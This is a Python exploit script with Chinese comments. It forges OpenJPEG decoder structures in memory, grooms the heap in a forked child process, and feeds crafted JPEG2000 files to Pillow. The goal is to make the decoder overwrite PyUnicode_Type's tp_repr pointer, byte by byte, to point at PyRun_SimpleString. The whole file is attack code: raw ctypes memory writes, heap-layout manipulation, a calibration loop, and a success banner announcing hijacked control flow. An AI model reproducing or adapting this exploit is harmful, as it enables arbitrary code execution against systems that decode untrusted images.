#!/usr/bin/env python3
# 终局合并版：完整伪造树（routeB 的结构） + 干净 harness（num_resolutions=1 / 自动标定 / fork 隔离）
#   树：tilecomp -> res[0] -> band[0] -> prec[0] -> cblk[0] -> seg[0] / chunk[0] -> 我们的压缩段
#   段来自我们自己 payload 的 tile0 数据（num_resolutions=1 => 单分辨率单码块）
#   目标：解码器把解码出的样本写进 fake.data = PyUnicode_Type.tp_repr 的四个字节
import ctypes, gc, io, os, re, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
TP_REPR = 0xA3C908
VAL = 0x00451A9C
PAY = '/tmp/tp.j2k'
BUILT = '/tmp/tb.j2k'
HOLD = []


def low_buffer(n):
    for _ in range(64):
        b = bytearray(n)
        v = (ctypes.c_char * n).from_buffer(b)
        HOLD.append((b, v))
        a = ctypes.addressof(v)
        if a < 0x1000000:
            return b, a
    raise RuntimeError('no low buffer')


def W64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def W32(a, v):
    ctypes.c_uint32.from_address(a).value = v & 0xFFFFFFFF


def Wf(a, v):
    ctypes.c_float.from_address(a).value = v


# 单一低地址 staging：所有结构都在里面
ST_O, ST = low_buffer(8192)
TC = ST + 0x000          # tilecomp (112B)
RS = ST + 0x200          # resolution[0] (40B)
BD = ST + 0x400          # band[0] (48B)
PR = ST + 0x600          # precinct[0] (56B)
CB = ST + 0x800          # cblk[0] (88B)
SG = ST + 0xA00          # seg[0] (24B)
CH = ST + 0xC00          # chunk[0] (16B)
SEG = ST + 0x1000        # 压缩段数据（最多 1024B）
print("[*] staging=%#x  TC=%#x RS=%#x BD=%#x PR=%#x CB=%#x SG=%#x CH=%#x SEG=%#x"
      % (ST, TC, RS, BD, PR, CB, SG, CH, SEG))
if max(TC, RS, BD, PR, CB, SG, CH, SEG) >= 0x1000000:
    print("[!] 地址不可表达"); sys.exit(1)


def enc_payload(byte_val):
    code = ("from PIL import Image\n"
            "im = Image.new('L', (16,16))\n"
            "im.putdata([%d] + [0]*255)\n"
            "im.save(%r,'JPEG2000', tile_size=(8,8), num_resolutions=1)\n" % (byte_val, PAY))
    subprocess.run([sys.executable, '-c', code], capture_output=True, check=True)


def load_segment(seg_off_in_soddata, seglen):
    """从 payload 的 tile0 数据（SOD 之后）里取一段作为 cblk 的压缩数据"""
    d = open(PAY, 'rb').read()
    sots = []
    i = 0
    while True:
        j = d.find(b'\xff\x90', i)
        if j < 0:
            break
        sots.append(j)
        k = d.find(b'\xff\x93', j)
        if k < 0:
            break
        i = k + 2
    eoc = d.rfind(b'\xff\xd9')
    tp0 = d[sots[0]:sots[1] if len(sots) > 1 else eoc]
    sod = tp0.find(b'\xff\x93')
    body = tp0[sod + 2:]
    seg = body[seg_off_in_soddata:seg_off_in_soddata + seglen]
    return seg, len(tp0), sod


def build_tree(seg, seglen, target):
    # tilecomp
    W32(TC + 0x00, 0); W32(TC + 0x04, 0); W32(TC + 0x08, 16); W32(TC + 0x0c, 16)
    W32(TC + 0x10, 0)                 # compno
    W32(TC + 0x14, 1)                 # numresolutions = 1
    W32(TC + 0x18, 1)                 # minimum_num_resolutions
    W64(TC + 0x20, RS)
    W32(TC + 0x28, 40)
    W64(TC + 0x30, target)            # ★ data
    W32(TC + 0x38, 0)                 # ownsData
    W64(TC + 0x40, 4096)
    W64(TC + 0x48, 4096)
    W64(TC + 0x50, 0)
    W32(TC + 0x70, 256)
    # res[0]
    W32(RS + 0x00, 0); W32(RS + 0x04, 0); W32(RS + 0x08, 16); W32(RS + 0x0c, 16)
    W32(RS + 0x10, 1); W32(RS + 0x14, 1)     # pw, ph
    W32(RS + 0x18, 1)                        # numbands = 1
    W64(RS + 0x20, BD)
    # band[0]
    W32(BD + 0x00, 0); W32(BD + 0x04, 0); W32(BD + 0x08, 16); W32(BD + 0x0c, 16)
    W32(BD + 0x10, 0)                        # bandno
    W64(BD + 0x18, PR)
    W32(BD + 0x20, 56)
    W32(BD + 0x24, 8)                        # numbps
    Wf(BD + 0x28, 1.0)
    # prec[0]
    W32(PR + 0x00, 0); W32(PR + 0x04, 0); W32(PR + 0x08, 16); W32(PR + 0x0c, 16)
    W32(PR + 0x10, 1); W32(PR + 0x14, 1)     # cw, ch
    W64(PR + 0x18, CB)
    W32(PR + 0x20, 88)
    W64(PR + 0x28, 0)                        # incltree
    W64(PR + 0x30, 0)                        # imsbtree
    # cblk[0]
    W64(CB + 0x00, SG)
    W64(CB + 0x08, CH)
    W32(CB + 0x10, 0); W32(CB + 0x14, 0); W32(CB + 0x18, 16); W32(CB + 0x1c, 16)
    W32(CB + 0x20, 8)                        # Mb
    W32(CB + 0x24, 8)                        # numbps
    W32(CB + 0x28, 3)                        # numlenbits
    W32(CB + 0x2c, 1)                        # numnewpasses
    W32(CB + 0x30, 1)                        # numsegs
    W32(CB + 0x34, 1)                        # real_num_segs
    W32(CB + 0x38, 1)                        # m_current_max_segs
    W32(CB + 0x3c, 1)                        # numchunks
    W32(CB + 0x40, 1)                        # numchunksalloc
    W64(CB + 0x48, 0)                        # decoded_data
    W32(CB + 0x50, 0)                        # corrupted
    # seg[0]
    W32(SG + 0x00, seglen)
    W32(SG + 0x04, 1)
    W32(SG + 0x08, 1)
    W32(SG + 0x0c, 1)
    W32(SG + 0x10, 1)
    W32(SG + 0x14, seglen)
    # chunk[0]
    W64(CH + 0x00, SEG)
    W32(CH + 0x08, seglen)


def build_file(byte_val, A):
    C = A + 0x8000
    code = ("import subprocess,sys\n"
            "r = subprocess.run(['python3','/tmp/mk13.py',%r,%r,'0','23',%r,%r,%r,'-370'],\n"
            "                   capture_output=True,text=True)\n"
            "sys.stdout.write(r.stdout)\n" % (PAY, BUILT, hex(A), hex(A + 0x1000), hex(C)))
    r = subprocess.run([sys.executable, '-c', code], capture_output=True, text=True)
    return (r.stdout or '').strip() or (r.stderr or '')[:70]


def run_child(path, logpath):
    pid = os.fork()
    if pid == 0:
        fd = os.open(logpath, os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
        os.dup2(fd, 2)
        try:
            gc.collect()
            prime = [bytes(519) for _ in range(1024)]
            del prime
            pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
            good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
            if good:
                keep = [t for i, t in enumerate(good) if i != len(good) // 2]
                Ks = [B for (D, B) in keep]
                holeD = good[len(good) // 2][0]
                del holeD, pairs, good
                gc.collect()
                M = open(path, 'rb').read()
                im = Image.open(io.BytesIO(M)); im.load()
        except BaseException:
            pass
        os._exit(0)
    os.waitpid(pid, 0)
    return open(logpath, errors='ignore').read()


def comps_written(log):
    v = None
    for ln in log.splitlines():
        m = re.search(r'write_at=\+584 val=(0x[0-9a-f]+)', ln)
        if m:
            v = int(m.group(1), 16)
    return v


print("[*] tp_repr 原值 = %#x  目标 = %#x" % (R(TP_REPR), VAL))
open('/tmp/progress4.log', 'w').close()

# 段内偏移经验值（SOD 之后 packet header 之后）—— 先试 2
for stage in range(4):
    byte_val = (VAL >> (8 * stage)) & 0xFF
    enc_payload(byte_val)
    seg, tplen, sodpos = load_segment(2, 128)
    ctypes.memmove(SEG, seg, len(seg))
    build_tree(seg, len(seg), TP_REPR + stage)

    A = TC - 0x0c
    ok = None
    for attempt in range(8):
        out = build_file(byte_val, A)
        if 'OK' not in out:
            ok = "build失败 %s" % out[:40]
            break
        log = run_child(BUILT, '/tmp/tree_%d.log' % stage)
        w = comps_written(log)
        if w is None:
            ok = "无 +584 记录"
            continue
        if w == TC:
            ok = "标定OK"
            break
        A += (TC - w)
    line = "段%d byte=%#x seglen=%d %s tp_repr=%#x" % (stage + 1, byte_val, len(seg), ok, R(TP_REPR))
    with open('/tmp/progress4.log', 'a') as f:
        f.write(line + "\n")
    print("[*] " + line, flush=True)

final = R(TP_REPR)
print()
print("[*] 最终 tp_repr = %#x   期望 = %#x" % (final, VAL))
if (final & 0xFFFFFFFF) == VAL:
    print("\n*** SUCCESS *** tp_repr = 0x451a9c (PyRun_SimpleString) 控制流入口打通")